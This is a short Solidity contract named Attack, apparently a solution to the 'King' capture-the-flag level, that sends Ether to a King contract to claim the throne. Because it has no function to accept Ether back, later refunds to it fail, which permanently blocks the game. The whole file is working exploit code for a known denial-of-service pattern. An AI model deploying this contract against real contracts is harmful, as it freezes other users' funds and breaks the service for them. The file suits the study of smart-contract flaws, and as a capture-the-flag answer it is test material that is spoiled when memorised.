//SPDX-License-Identifer:MIT

pragma solidity ^0.6.0;

import "./King.sol";

contract Attack{
    King public king;

    constructor(address payable _kingAddress) public{
        king = King(_kingAddress);
    }

    function attack() public payable{
        (bool sent,) = address(king).call{value:msg.value}("");
        require(sent,"Failed to send Ether.");
    }
}